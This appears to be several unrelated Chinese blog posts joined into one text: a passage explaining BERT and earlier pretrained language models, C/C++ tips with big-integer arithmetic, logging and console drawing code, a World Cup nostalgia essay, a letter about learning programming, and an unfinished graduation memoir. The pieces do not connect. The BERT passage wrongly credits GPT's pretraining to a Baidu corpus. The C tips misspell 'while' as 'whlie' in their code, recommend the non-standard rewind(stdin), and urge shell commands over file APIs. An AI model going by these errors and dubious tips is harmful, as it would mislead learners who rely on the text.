编码，同时结合原有的词级别编码一起通过双层LSTM变换来进行语言模型预训练。经过实验验证，最后选择了512维的词级别ELMo向量进行后续任务。在ELMo获得成功以后不久FastAI就推出了[ULMFiT](https://arxiv.org/abs/1801.06146)，其大体思路是在微调时对每一层设置不同的学习率。此后OpenAI又提出了[GPT](https://blog.openai.com/language-unsupervised/)。预训练的语言模型是在百度15亿词文本的语料上进行的，模型参数选择了12层，12head的Transformer结构。然后采用此模型直接在子任务上微调来进行后续任务。从上面提及的这些论文的结果以及学界和工业界的反馈来看，这种使用大量的语料进行预训练，然后再在预训练好的模型上进行后续任务训练，虽然训练方式各有不同，但在后续任务都有不同程度的提高。而谷歌提出的BERT就是在OpenAI的GPT的基础上对预训练的目标进行了修改，并用更大的模型以及更多的数据去进行预训练，从而得到了目前为止最好的效果。Trransformer的编码器结构BERT的主体结构和创新点BERT模型沿袭了GPT模型的结构，采用[Transfomer](https://arxiv.org/abs/1706.03762)的编码器作为主体模型结构。Transformer舍弃了RNN的循环式网络结构，完全基于注意力机制来对一段文本进行建模。Transformer所使用的注意力机制的核心思想是去计算一句话中的每个词对于这句话中所有词的相互关系，然后认为这些词与词之间的相互关系在一定程度上反应了这句话中不同词之间的关联性以及重要程度。因此再利用这些相互关系来调整每个词的重要性（权重）就可以获得每个词新的表达。这个新的表征不但蕴含了该词本身，还蕴含了其他词与这个词的关系，因此和单纯的词向量相比是一个更加全局的表达。Transformer通过对输入的文本不断进行这样的注意力机制层和普通的非线性层交叠来得到最终的文本表达。Transformer的注意力层得到的词-词之间关系GPT则利用了Transformer的结构来进行单向语言模型的训练。所谓的语言模型其实是自然语言处理中的一种基础任务，其目标是给定一个序列文本，预测下一个位置上会出现的词。模型学习这样的任务过程和我们人学习一门语言的过程有些类似。我们学习语言的时候会不断地练习怎么选用合适的词来造句，对于模型来说也这样。例如：  > 今天天气不错，我们去公园玩吧。这句话，单向语言模型在学习的时候是从左向右进行学习的，先给模型看到“今天天气”两个词，然后告诉模型下一个要填的词是“不错”。然而单向语言模型有一个欠缺，就是模型学习的时候总是按照句子的一个方向去学的，因此模型学习每个词的时候只看到了上文，并没有看到下文。更加合理的方式应该是让模型同时通过上下文去学习，这个过程有点类似于完形填空题。例如：  >今天天气 { }，我们去公园玩吧。通过这样的学习，模型能够更好地把握“不错”这个词所出现的上下文语境。而BERT对GPT的第一个改进就是引入了双向的语言模型任务。此前其实也有一些研究在语言模型这个任务上使用了双向的方法，例如在ELMo中是通过双向的两层RNN结构对两个方向进行建模，但两个方向的loss计算相互独立。追一科技在文本意图模型中，也加入了通过上下文预测某个词的辅助任务，通过实验发现在做意图分类的同时加入这个辅助任务能够让编码器尽可能的包含输入文本的全局信息，从而提高意图判断的准确率。而BERT的作者指出这种两个方向相互独立或只有单层的双向编码可能没有发挥最好的效果，我们可能不仅需要双向编码，还应该要加深网络的层数。但加深双向编码网络却会引入一个问题，导致模型最终可以间接地“窥探”到需要预测的词。这个“窥探”的过程可以用下面的图来表示：从图中可以看到经过两层的双向操作，每个位置上的输出就已经带有了原本这个位置上的词的信息了。这样的“窥探”会导致模型预测词的任务变得失去意义，因为模型已经看到每个位置上是什么词了。为了解决这个问题，我们可以从预训练的目标入手。我们想要的其实是让模型学会某个词适合出现在怎样的上下文语境当中；反过来说，如果给定了某个上下文语境，我们希望模型能够知道这个地方适合填入怎样的词。从这一点出发，其实我们可以直接去掉这个词，只让模型看上下文，然后来预测这个词。但这样做会丢掉这个词在文本中的位置信息，那么还有一种方式是在这个词的位置上随机地输入某一个词，但如果每次都随机输入可能会让模型难以收敛。BERT的作者提出了采用MaskLM的方式来训练语言模型通俗地说就是在输入一句话的时候，随机地选一些要预测的词，然后用一个特殊的符号来代替它们。尽管模型最终还是会看到所有位置上的输入信息，但由于需要预测的词已经被特殊符号代替，所以模型无法事先知道这些位置上是什么词，这样就可以让模型根据所给的标签去学习这些地方该填的词了。然而这里还有一个问题，就是我们在预训练过程中所使用的这个特殊符号，在后续的任务中是不会出现的。因此，为了和后续任务保持一致，作者按一定的比例在需要预测的词位置上输入原词或者输入某个随机的词。当然，由于一次输入的文本序列中只有部分的词被用来进行训练，因此BERT在效率上会低于普通的语言模型，作者也指出BERT的收敛需要更多的训练步数。BERT另外一个创新是在双向语言模型的基础上额外增加了一个句子级别的连续性预测任务。这个任务的目标也很简单，就是预测输入BERT的两端文本是否为连续的文本，作者指出引入这个任务可以更好地让模型学到连续的文本片段之间的关系。在训练的时候，输入模型的第二个片段会以50%的概率从全部文本中随机选取，剩下50%的概率选取第一个片段的后续的文本。除了模型结构，模型大小和数据量都很重要以上的描述涵盖了BERT在模型结构和训练目标上的主要创新点，而BERT的成功还有一个很大的原因来自于模型的体量以及训练的数据量。BERT训练数据采用了英文的开源语料BooksCropus 以及英文维基百科数据，一共有33亿个词。同时BERT模型的标准版本有1亿的参数量，与GPT持平，而BERT的大号版本有3亿多参数量，这应该是目前自然语言处理中最大的预训练模型了。当然，这么大的模型和这么多的数据，训练的代价也是不菲的。谷歌用了16个自己的TPU集群（一共64块TPU）来训练大号版本的BERT，一共花了4天的时间。对于是否可以复现预训练，作者在 [Reddit](https://www.reddit.com/r/MachineLearning/comments/9nfqxz/r_bert_pretraining_of_deep_bidirectional)上有一个大致的回复，指出OpenAI当时训练GPT用了将近1个月的时间，而如果用同等的硬件条件来训练BERT估计需要1年的时间。不过他们会将已经训练好的模型和代码开源，方便大家训练好的模型上进行后续任务。虽然训练的代价很大，但是这个研究还是带来了一些思考和启发。例如双向语言模型的运用，多任务对预训练的帮助以及模型深度带来的收益。相信在未来的一段时间，自然语言处理中预训练的神经网络语言模型会得到更多的关注和运用。论文原文：https://arxiv.org/abs/1810.04805







 VC调试(TC或BC用TD调试)时按Alt+8、Alt+6和Alt+5,打开汇编窗口、内存窗口和寄存器窗口看每句C对应的汇编、单步执行并观察相应内存和寄存器变化，这样过一遍不就啥都明白了吗。
（Linux或Unix下可以在用GDB调试时,看每句C对应的汇编并单步执行观察相应内存和寄存器变化。）
想要从本质上理解C指针，必须学习汇编以及C和汇编的对应关系。
从汇编的角度理解和学习C语言的指针，原本看似复杂的东西就会变得非常简单！
指针即地址。“地址又是啥？”“只能从汇编语言和计算机组成原理的角度去解释了。”
提醒：
“学习用汇编语言写程序”
和
“VC调试(TC或BC用TD调试)时按Alt+8、Alt+6和Alt+5,打开汇编窗口、内存窗口和寄存器窗口看每句C对应的汇编、单步执行并观察相应内存和寄存器变化，这样过一遍不就啥都明白了吗。
（Linux或Unix下可以在用GDB调试时,看每句C对应的汇编并单步执行观察相应内存和寄存器变化。）
想要从本质上理解C指针，必须学习C和汇编的对应关系。”
不是一回事！
不要迷信书、考题、老师、回帖；
要迷信CPU、编译器、调试器、运行结果。
并请结合“盲人摸太阳”和“驾船出海时一定只带一个指南针。”加以理解。
 
做个可能不太恰当的比喻：
人想让狗帮忙逮只兔子，可是人说话狗听不懂，于是人发明了一种介乎人言和狗语之间的语言，即口令。
人想让电脑帮忙做计算，可是人话电脑听不懂，于是人发明了一种介乎人言和汇编机器码之间的语言，即C语言。
人对狗的口令得让人容易学、也得让狗容易懂。
C语言同样得让人容易学、也得让电脑容易懂。
相比之下C++、Java就是人学得费劲、电脑也经常闹不懂。
说：“决定战争胜负的关键因素是人不是武器。”


不要使用
while (条件)
更不要使用
while (组合条件)
要使用
while (1) {
  if (条件1) break;
  //...
  if (条件2) continue;
  //...
  if (条件3) return;
  //...
}
因为前两种写法在语言表达意思的层面上有二义性，只有第三种才忠实反映了程序流的实际情况。
典型如：
下面两段的语义都是当文件未结束时读字符
whlie (!feof(f)) {
  a=fgetc(f);
  //...
  b=fgetc(f);//可能此时已经feof了！
  //...
}
而这样写就没有问题：
whlie (1) {
  a=fgetc(f);
  if (feof(f)) break;
  //...
  b=fgetc(f);
  if (feof(f)) break;
  //...
}
类似的例子还可以举很多。
检查是否资源泄漏的办法之一：
在任务管理器 进程 查看 选择列 里面选择：内存使用、虚拟内存大小、句柄数、线程数、USER对象、GDI对象
让你的程序(进程)不退出,循环执行主流程很多遍，越多越好，比如1000000次甚至无限循环，记录以上各数值，再隔至少一小时，越长越好，比如一个月，再记录以上各数值。如果以上两组数值的差较大或随时间流逝不断增加，则铁定有对应资源的资源泄漏！
C++只是一种面向对象的编程思想。
再抽象的编程语言，最后不都变成汇编代码了吗？我们完全可以说汇编语言是面向对象、脚本化、动态化、泛函化、并行化、分布化的语言。
这个世界上最大的差别和最远的距离都存在于“说”和“做”之间。
程序员要做的不是尽力避免错误，而是聚焦在快速发现并改正错误。真正以快速方式轻易解决错误，“快速的失败”远胜过“预防错误”。Fred George
在Word2003中开始记录宏，手动完成所需功能，结束记录宏，按Alt+F11键，查看刚才记录的宏对应的VBA代码。
system("dir /b /a-d c:\\*.* >d:\\allfiles.txt");
//读文件d:\\allfiles.txt的内容即C:\\下所有文件的名字
system("dir /b /ad c:\\*.* >d:\\alldirs.txt");
//读文件d:\\alldirs.txt的内容即C:\\下所有子目录的名字
请记住，能用shell命令获取文件、文件夹信息或者操作文件、文件夹最好用shell命令获取或者操作，而不要用各种API获取或者操作，因为当遇到非法文件夹名或非法文件名或非法文件长度、非法文件日期、压缩文件、链接文件、稀疏文件……等各种意料之外的情况时，API会处理的不全面或陷入死循环，而shell命令不会。
在占用内存空间较大的局部数组声明的前面加static将其从堆栈数据段挪到全局数据段即可。
要想在Windows环境下稳定运行tc.exe
建一个批处理tc.bat,内容为下面两行，放在tc.exe同目录下，再将tc.bat发送到桌面快捷方式：
del tc*.swp >NUL
start command /c tc.exe
如果想在IDE里面使用鼠标，还应将快捷方式属性中的快速编辑模式关掉。
printf里面的%和变量的一一对应关系
scanf里面的%和变量以及变量前加不加&的一一对应关系
是C代码中非常容易出错的地方。
所以在编译源代码之前值得专门仔细检查一遍甚至多遍。
在每个最后不带\n的printf后面加fflush(stdout);
在每个不想受接收缓冲区旧内容影响的scanf前面加rewind(stdin);
另外请检查scanf的返回值。
#pragma comment(linker,"/SECTION:.rdata,RW")
#pragma comment(lib,"user32")
#pragma warning(disable:4996)
所谓修改删除文件a某位置的内容，其实是读打开文件a，再将‘a中修改删除位置之前的内容＋修改删除的内容＋a中修改删除位置之后的内容’保存到文件b，关闭文件a，删除文件a，将文件b改名为与之前文件a相同的名字，仅此而已。
 
 
 
 

#include <iostream>
#include <string>
using namespace std;
inline int compare(string str1,string str2) {//相等返回0，大于返回1，小于返回-1
         if (str1.size()>str2.size()) return 1; //长度长的整数大于长度小的整数
    else if (str1.size()<str2.size()) return -1;
    else                              return str1.compare(str2); //若长度相等，则头到尾按位比较
}
string SUB_INT(string str1,string str2);
string ADD_INT(string str1,string str2) {//高精度加法
    int sign=1; //sign 为符号位
    string str;
    if (str1[0]=='-') {
        if (str2[0]=='-') {
            sign=-1;
            str=ADD_INT(str1.erase(0,1),str2.erase(0,1));
        } else {
            str=SUB_INT(str2,str1.erase(0,1));
        }
    } else {
        if (str2[0]=='-') {
            str=SUB_INT(str1,str2.erase(0,1));
        } else { //把两个整数对齐，短整数前面加0补齐
            string::size_type L1,L2;
            int i;
            L1=str1.size();
            L2=str2.size();
            if (L1<L2) {
                for (i=1;i<=L2-L1;i++) str1="0"+str1;
            } else {
                for (i=1;i<=L1-L2;i++) str2="0"+str2;
            }
            int int1=0,int2=0; //int2 记录进位
            for (i=str1.size()-1;i>=0;i--) {
                int1=(int(str1[i])-'0'+int(str2[i])-'0'+int2)%10;
                int2=(int(str1[i])-'0'+int(str2[i])-'0'+int2)/10;
                str=char(int1+'0')+str;
            }
            if (int2!=0) str=char(int2+'0')+str;
        }
    }
    //运算后处理符号位
    if ((sign==-1)&&(str[0]!='0')) str="-"+str;
    return str;
}
string SUB_INT(string str1,string str2) {//高精度减法
    int sign=1; //sign 为符号位
    string str;
    int i,j;
    if (str2[0]=='-') {
        str=ADD_INT(str1,str2.erase(0,1));
    } else {
        int res=compare(str1,str2);
        if (res==0) return "0";
        if (res<0) {
            sign=-1;
            string temp =str1;
            str1=str2;
            str2=temp;
        }
        string::size_type tempint;
        tempint=str1.size()-str2.size();
        for (i=str2.size()-1;i>=0;i--) {
            if (str1[i+tempint]<str2[i]) {
                j=1;
                while (1) {//zhao4zhong1添加
                    if (str1[i+tempint-j]=='0') {
                        str1[i+tempint-j]='9';
                        j++;
                    } else {
                        str1[i+tempint-j]=char(int(str1[i+tempint-j])-1);
                        break;
                    }
                }
                str=char(str1[i+tempint]-str2[i]+':')+str;
            } else {
                str=char(str1[i+tempint]-str2[i]+'0')+str;
            }
        }
        for (i=tempint-1;i>=0;i--) str=str1[i]+str;
    }
    //去除结果中多余的前导0
    str.erase(0,str.find_first_not_of('0'));
    if (str.empty()) str="0";
    if ((sign==-1) && (str[0]!='0')) str ="-"+str;
    return str;
}
string MUL_INT(string str1,string str2) {//高精度乘法
    int sign=1; //sign 为符号位
    string str;
    if (str1[0]=='-') {
        sign*=-1;
        str1 =str1.erase(0,1);
    }
    if (str2[0]=='-') {
        sign*=-1;
        str2 =str2.erase(0,1);
    }
    int i,j;
    string::size_type L1,L2;
    L1=str1.size();
    L2=str2.size();
    for (i=L2-1;i>=0;i--) { //模拟手工乘法竖式
        string tempstr;
        int int1=0,int2=0,int3=int(str2[i])-'0';
        if (int3!=0) {
            for (j=1;j<=(int)(L2-1-i);j++) tempstr="0"+tempstr;
            for (j=L1-1;j>=0;j--) {
                int1=(int3*(int(str1[j])-'0')+int2)%10;
                int2=(int3*(int(str1[j])-'0')+int2)/10;
                tempstr=char(int1+'0')+tempstr;
            }
            if (int2!=0) tempstr=char(int2+'0')+tempstr;
        }
        str=ADD_INT(str,tempstr);
    }
    //去除结果中的前导0
    str.erase(0,str.find_first_not_of('0'));
    if (str.empty()) str="0";
    if ((sign==-1) && (str[0]!='0')) str="-"+str;
    return str;
}
string DIVIDE_INT(string str1,string str2,int flag) {//高精度除法。flag==1时,返回商; flag==0时,返回余数
    string quotient,residue; //定义商和余数
    int sign1=1,sign2=1;
    if (str2 == "0") {  //判断除数是否为0
        quotient= "ERROR!";
        residue = "ERROR!";
        if (flag==1) return quotient;
        else         return residue ;
    }
    if (str1=="0") { //判断被除数是否为0
        quotient="0";
        residue ="0";
    }
    if (str1[0]=='-') {
        str1   = str1.erase(0,1);
        sign1 *= -1;
        sign2  = -1;
    }
    if (str2[0]=='-') {
        str2   = str2.erase(0,1);
        sign1 *= -1;
    }
    int res=compare(str1,str2);
    if (res<0) {
        quotient="0";
        residue =str1;
    } else if (res == 0) {
        quotient="1";
        residue ="0";
    } else {
        string::size_type L1,L2;
        L1=str1.size();
        L2=str2.size();
        string tempstr;
        tempstr.append(str1,0,L2-1);
        for (int i=L2-1;i<L1;i++) { //模拟手工除法竖式
            tempstr=tempstr+str1[i];
            tempstr.erase(0,tempstr.find_first_not_of('0'));//zhao4zhong1添加
            if (tempstr.empty()) tempstr="0";//zhao4zhong1添加
            for (char ch='9';ch>='0';ch--) { //试商
                string str;
                str=str+ch;
                if (compare(MUL_INT(str2,str),tempstr)<=0) {
                    quotient=quotient+ch;
                    tempstr =SUB_INT(tempstr,MUL_INT(str2,str));
                    break;
                }
            }
        }
        residue=tempstr;
    }
    //去除结果中的前导0
    quotient.erase(0,quotient.find_first_not_of('0'));
    if (quotient.empty()) quotient="0";
    if ((sign1==-1)&&(quotient[0]!='0')) quotient="-"+quotient;
    if ((sign2==-1)&&(residue [0]!='0')) residue ="-"+residue ;
    if (flag==1) return quotient;
    else         return residue ;
}
string DIV_INT(string str1,string str2) {//高精度除法,返回商
    return DIVIDE_INT(str1,str2,1);
}
string MOD_INT(string str1,string str2) {//高精度除法,返回余数
    return DIVIDE_INT(str1,str2,0);
}
int main() {
    char ch;
    string s1,s2,res;

    while (cin>>s1>>ch>>s2) {
        switch (ch) {
            case '+':res=ADD_INT(s1,s2);break;
            case '-':res=SUB_INT(s1,s2);break;
            case '*':res=MUL_INT(s1,s2);break;
            case '/':res=DIV_INT(s1,s2);break;
            case '%':res=MOD_INT(s1,s2);break;
            default :                   break;
        }
        cout<<res<<endl;
    }
    return(0);
}
 
 
写日志文件：

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#ifdef WIN32
    #include <windows.h>
    #include <io.h>
#else
    #include <unistd.h>
    #include <sys/time.h>
    #include <pthread.h>
    #define  CRITICAL_SECTION   pthread_mutex_t
    #define  _vsnprintf         vsnprintf
#endif
//Log{
#define MAXLOGSIZE 20000000
#define MAXLINSIZE 16000
#include <time.h>
#include <sys/timeb.h>
#include <stdarg.h>
char logfilename1[]="MyLog1.log";
char logfilename2[]="MyLog2.log";
static char logstr[MAXLINSIZE+1];
char datestr[16];
char timestr[16];
char mss[4];
CRITICAL_SECTION cs_log;
FILE *flog;
#ifdef WIN32
void Lock(CRITICAL_SECTION *l) {
    EnterCriticalSection(l);
}
void Unlock(CRITICAL_SECTION *l) {
    LeaveCriticalSection(l);
}
#else
void Lock(CRITICAL_SECTION *l) {
    pthread_mutex_lock(l);
}
void Unlock(CRITICAL_SECTION *l) {
    pthread_mutex_unlock(l);
}
#endif
void LogV(const char *pszFmt,va_list argp) {
    struct tm *now;
    struct timeb tb;

    if (NULL==pszFmt||0==pszFmt[0]) return;
    _vsnprintf(logstr,MAXLINSIZE,pszFmt,argp);
    ftime(&tb);
    now=localtime(&tb.time);
    sprintf(datestr,"%04d-%02d-%02d",now->tm_year+1900,now->tm_mon+1,now->tm_mday);
    sprintf(timestr,"%02d:%02d:%02d",now->tm_hour     ,now->tm_min  ,now->tm_sec );
    sprintf(mss,"%03d",tb.millitm);
    printf("%s %s.%s %s",datestr,timestr,mss,logstr);
    flog=fopen(logfilename1,"a");
    if (NULL!=flog) {
        fprintf(flog,"%s %s.%s %s",datestr,timestr,mss,logstr);
        if (ftell(flog)>MAXLOGSIZE) {
            fclose(flog);
            if (rename(logfilename1,logfilename2)) {
                remove(logfilename2);
                rename(logfilename1,logfilename2);
            }
        } else {
            fclose(flog);
        }
    }
}
void Log(const char *pszFmt,...) {
    va_list argp;

    Lock(&cs_log);
    va_start(argp,pszFmt);
    LogV(pszFmt,argp);
    va_end(argp);
    Unlock(&cs_log);
}
//Log}
int main(int argc,char * argv[]) {
    int i;
#ifdef WIN32
    InitializeCriticalSection(&cs_log);
#else
    pthread_mutex_init(&cs_log,NULL);
#endif
    for (i=0;i<10000;i++) {
        Log("This is a Log %04d from FILE:%s LINE:%d\n",i, __FILE__, __LINE__);
    }
#ifdef WIN32
    DeleteCriticalSection(&cs_log);
#else
    pthread_mutex_destroy(&cs_log);
#endif
    return 0;
}
//1-78行添加到你带main的.c或.cpp的那个文件的最前面
//81-85行添加到你的main函数开头
//89-93行添加到你的main函数结束前
//在要写LOG的地方仿照第87行的写法写LOG到文件MyLog1.log中


控制台输出中文：
 

#pragma comment(lib,"user32")
#pragma comment(lib,"gdi32")
#include <stdio.h>
#include <conio.h>
#include <stdlib.h>
#include <windows.h>
HWND WINAPI GetConsoleWindow();
void HideTheCursor() {
    CONSOLE_CURSOR_INFO cciCursor;
    HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (GetConsoleCursorInfo(hStdOut, &cciCursor)) {
        cciCursor.bVisible = FALSE;
        SetConsoleCursorInfo(hStdOut, &cciCursor);
    }
}
void ShowTheCursor() {
    CONSOLE_CURSOR_INFO cciCursor;
    HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (GetConsoleCursorInfo(hStdOut, &cciCursor)) {
        cciCursor.bVisible = TRUE;
        SetConsoleCursorInfo(hStdOut, &cciCursor);
    }
}
int main() {
    HWND   hwnd;
    HDC    hdc;
    HFONT  hfont;
    RECT   rect,wsize;
    HBRUSH hbrush;
    int    y,x,d,g;

    system("color F0");
    system("cls");
    HideTheCursor();
    hwnd  =GetConsoleWindow();
    GetClientRect(hwnd,&wsize);
    hdc   =GetDC(hwnd);
    hfont =CreateFont(48,0,0,0,0,0,0,0,0,0,0,0,0,"华文楷体");
    hbrush=CreateSolidBrush((COLORREF)0x00FFFFFF);
    SelectObject(hdc,hfont);
    y=10;x=30;d=4;g=3;
    while (1) {
        rect.left=x;
        rect.top=y;
        rect.right=x+300+d+1;
        rect.bottom=y+60+d+1;
        FillRect(hdc, &rect, hbrush);
        TextOut(hdc,x+10,y+10,"地球人都知道！",14);
        MoveToEx(hdc,x+5,y+5,NULL);
        LineTo(hdc,x+300,y+  5);
        LineTo(hdc,x+300,y+ 60);
        LineTo(hdc,x+  5,y+ 60);
        LineTo(hdc,x+  5,y+  5);
        Sleep(15);
        if (_kbhit()) {getch();break;}
        switch (g) {
        case 0:if (y>                d) y-=d; else g=2;if (x>                d) x-=d; else g=1;break;// ↖
        case 1:if (y>                d) y-=d; else g=3;if (x<wsize.right-300-d) x+=d; else g=0;break;// ↗
        case 2:if (y<wsize.bottom-60-d) y+=d; else g=0;if (x>                d) x-=d; else g=3;break;// ↙
        case 3:if (y<wsize.bottom-60-d) y+=d; else g=1;if (x<wsize.right-300-d) x+=d; else g=2;break;// ↘
        }
    }
    DeleteObject(hbrush);
    DeleteObject(hfont);
    ReleaseDC(hwnd,hdc);
    system("color 07");
    system("cls");
    ShowTheCursor();
    return 0;
}

 

 
 
 









作者：魏超
这里写图片描述

7月15日，2018年俄罗斯世界杯，将迎来结局的最终章。25个比赛日，64场比赛，都将在今晚的巅峰对决后画上句号。四年一次的盛宴太过难得，最后一战的烟花落幕后，迎面而来的将是又一个四年的等待。
     ——摘自天下足球官方公众号《世界杯看球也是追星？他们遇见了更好的自己》


关于足球，我这个拽着80尾巴的大叔是看着《足球小子》长大的，小翼、若林源三、大郎……这些主角的名字至今记忆犹新。关于世界杯，2002年的夏天，我小学刚毕业，村里娃没有小升初摇号的烦恼，暑假里和几个小伙伴报名了补习班。翻着借来的课本、读着绕口的英文单词，演算着不知其所以然的数学定理……这些情景历历在目。当年所学的ABCD早已抛之脑后，但数学老师身上一件印满了人名的短袖却让我印象深刻。后来才知道那是一件印有中国球员签名的短袖，最显眼的“米卢”二字是当时主教练的名字。这是我仅存的有关2002年世界杯的记忆。

十二年过去了，看着日本队在俄罗斯踢得风生水起，与欧洲红魔比利时踢得有来有回，不由得悲从中来——2002年的我什么都不懂，错过了为国足呐喊助威的机会；如今在这样热血的年纪里却迟迟等不到一个为国足呐喊的机会。
八十年代的日本足球在中田英寿等人还没暂露头角的时候，一度被中国男足花式吊打。如今再与中国男足交锋，只怕国足很难与之抗衡。不知道当年一部动画片能引起多大的连锁反应，但据中田英寿承认，自己之所以选择足球，就是受《足球小将》那部漫画（PS：足球小将先有的漫画版，中文配音版翻译为《足球小子》）的影响。可以猜想到许多日本少年因为《足球小将》而爱上了足球，甚至不少人因此而走上了职业足球之路。据英国《每日邮报》报道，就连皮耶罗、托蒂、托雷斯、阿奎罗等球员在少年时代也曾深受这部动漫的影响。相信中国也许多因《足球小将》而爱上足球的孩子们。可现实是，俄罗斯世界杯上该去的都去了除了中国队。那批看《足球小将》的少年们如今也只能在电视机前看着国足一次次冲击世界杯失败而遗憾地拍大腿。
中国足球的现状和未来，我不够格来评头论足，只希望还能在吆喝呐喊地动的年纪里看到中国队再战世界杯！

聊完了《足球小将》和世界杯，再讲讲自己的足球记忆吧。从最早初中接触足球，到大一开始转战篮球，满打满算也就七年。记忆里，打进过一次点球，有过一次“油炸丸子”的过人，还有一脚射门闷在了球门角上。也许是受2006年世界杯的影响，高中的时候，学校里的足球氛围更浓烈一下，晚饭后的操场，晚自习后的路灯下，时常都能看到热血少年奔跑的影子。高一下了晚自习，在路灯下踢球是常有的事。每年还有学生自发组织的年级足球联赛，那脚打在球门角上的射门就是在高一参加年级足球比赛的时候发生的。高二的时候，有了那次“油炸丸子”过人的经历。在高四才打进了人生第一个正式比赛进球（简直不要太惨，谁叫你爱踢后卫啊，哈哈）。记得高四的时候，还有一场高三年级队和高四年级队的一场友谊赛。比赛过程异常激烈，导致学校的土操场上竟然里三圈外三圈围满了人，既有漂亮的甩头攻门，又有神奇的单刀扑救。一场比赛过后，直叫人大呼过瘾。而这些记忆仅仅折射出我们一个县城高中的足球氛围，也从侧面反映出那时中国足球的群众基础还不错。

回忆往昔路灯下踢球的场景，今日仍热血澎湃，那些当年一起流汗奔跑的小伙伴们也都成油腻的大叔了吧！
                                                        图片来源与网络，侵删！——作者注











本文最早原创首发于公众号：老王和他的IT界朋友们 
原文地址： 
https://mp.weixin.qq.com/s?__biz=MzIyMDQwNzc5MQ==&mid=2247484146&idx=1&sn=7fd4c13f7f5ac4e708c604124f8920a9&chksm=97cd3072a0bab964cbe16dc2bfc76adc5e2dfc88c6e0b9e2ab0594a66fd45442888acb8e3a63#rd
作者：躺在海里的猫喵

最近由于课题原因，需要学习C++和OpenCV相关的知识，经常逛CSDN,然后就认识了老王，还有他IT的朋友们。细聊之后，发现你们是一群灵魂有趣，而且特别有情怀的人。毕竟这个年代，有趣的灵魂太少，竟让我有些许欣喜。

写到这里，忽然就词穷了，看来书还是要多读的，今年的100本书计划已经搁置好久了，从开年到现在只读完了7本书，还是假期在家的时候读的，推荐两本书，一本是《卡尔威特的教育》，对如何启蒙孩子很有帮助，即使我们现在大都还没有孩子，但是婚总会结的，孩子也会有的，算是未雨绸缪吧。还有一本是《巴尔扎克集：三十岁的女人》，爱情，婚姻，责任，很多东西值得去体味。人类堕落的方式各有各的不同，优秀者的共性却也极为相似，这也是为什么要读书，要终生学习的原因。

再推荐一部纪录片《Becoming Warren Buffett 》(成为沃伦巴菲特)，这部纪录片向我们展示了一个事实：一个人一生如果想要获得过人的成就，注定要与读书和终生学习形影不离。这部记录片里，还原了一个真实的巴菲特，可以看到一个活生生的人，除去身上的光环，他只是一个平凡的老人而已。唯一不同的是，他比较自律，一生都在读书，保持学习。而实现终生学习的最佳途径就是阅读大量优秀的书籍。这部记录片，也说明了：成功是枯燥的，也是孤独的。然而孤独的最高境界终究是繁华，只有耐得住那份孤独，才能有资格享受那份繁华。

言归正传，不知如何形容你们，你们对代码的态度，那真是对技术的执着，不知道你们是否有信仰，大概就是那种感觉，虽然我是个没有信仰的人，用你们的话说就是技术宅，写不出满意的代码，那就不要睡觉。软件、算法是一件可以穷尽一生去琢磨的事情，需要的是匠人精神。


在我印象中，你们不仅执着，而且还有一种追求极致的态度，这也是我所缺少的，说出来不怕你们笑话，我是一个对自己要求不高的人，只要能实现功能就可以了，管它花了几秒，占用多大内存，可是你们会一遍遍的优化程序，想着怎么带来新的体验，有什么新的功能可以开发，更好的服务客户。虽然在这个过程中，有些开发者是因为危机意识，但是这种追求极致的品质是值得一提的，这一点也是值得我去借鉴和学习的。
我觉得自己还蛮有耐心的，可是相对于你们来说，真的是小巫见大巫了。刚接触代码不久，说个最简单的例子，VS和OpenCV之间需要各种配置，不同版本之间配置也有所区别，不同版本的函数库也不一样，对我来说真的是分不清的Dao Rai Mi，一不小心就各种Bug出现，编程的时候，对逻辑能力也是比较考验的，我的逻辑能力就不行，只要复杂一点，就怎么也想不明白了。Debug的过程我一直觉得是一个非常孤独的过程，也是极其需要耐心的，可能在你们眼里是一种乐趣吧。

在我眼中，这个优化的过程是特别艰难的，因为在这个过程中，需要保持空杯心态，如果始终在过去的逻辑里转悠，那么可能不会有什么新的突破，这时候就需要放空原来的已知，才能得到更多的未知。前几天看了一篇文章，说人的认知有四种状态[1]，也是人的四种境界：
不知道自己不知道—以为自己什么都知道，自以为是的认知状态。 
知道自己不知道—有敬畏之心，开始空杯心态，准备丰富自己的认知。 
知道自己知道—抓住了事情的规律，提升了自己的认知。 
不知道自己知道—永远保持空杯心态，认知的最高境界。
人与人的根本区别就在于这四种状态，更可怕的是，95%的人都处于第一种状态，甚至更多，这也就是为什么大多数人都在感叹“最怕一生碌碌无为，安慰自己平凡可贵。”有时候，你以为眼前的就是全世界，其实是因为眼界太狭隘，没有见过更大的世界而已。

所谓成长，就来自于认知，而认知的本质也是做选择。人和人一旦产生认知差别，就会做出完全不一样的选择，而这些选择，就决定了会有不同的人生轨迹。只有一个人，不断想学习，想了解，去反思；保持空杯心态，放下恐惧，不再拒绝改变，才可能真正的成长，实现跨越。《达摩流浪者》结尾有这么一句话“O ever youthful, O everweeping”,翻译过来是“永远年轻，永远热泪盈眶”，我想放在这里也很合适。

学习编程对我来说是一个全新的领域，面对新的领域有好奇，但更多的是一种焦虑感，因为要学习的东西太多，慢慢来，每天进步一点点我就很知足了。 
很高兴认识你们，跟着你们入门，学习的路上不孤单。

参考： 
1、《所谓成长就是认知升级》，傅盛，来源公众号Talent Guide 









好久没动笔了，上次憋了好几天码出的文字扔出去，石沉大海，没惊起半点涟漪。这次真不知道能憋出个什么鬼，索性就让思绪飞扬，飞到哪是哪! 
——题记

此处应有BGM: 少年锦时 
赵雷

1.以后真没有暑假喽
2016年01月06号，毕业证上落款的日子，拿着毕业证，从走出校门的那一刻，见到陌生人就再也不能不假思索地喊出“同学”二字了，我毕业了，滚蛋了，合上过去的篇章，迎接新的起点。那就缕缕思路将往事，记忆一并封存。

1.1 学校的生活二三事之大学前
不知各位小时候心中有没有为这个问题：长大了，到底是上清华呢，还是上北大，而纠结过。嗯，我没想过，因为当时听大人说还有个黄埔军校挺厉害的，于是我就默默立志长大了就去这个黄埔当个兵（ps，这里肯定有人想问:这个作者哪一年的？这怎么能告诉你，哼）。长大点了，一个小伙伴告诉我：书念到最高就是博士（bo si，方言）了，而且要一直读不能留级才行。于是我抱着不能留级的初衷，迈上了求学路。

奈何，不知是悟性不够，还是后天不够努力，从小到大，考试没拿过第一。记忆最深的一次是初三，同桌是那种玩得比谁都疯，考试却照样稳坐前三那种。有一天，我不知是心血来潮还是吃错了药，和另一位同学打赌说：这次我要考咱班第一，不然就从教室门口爬出去。
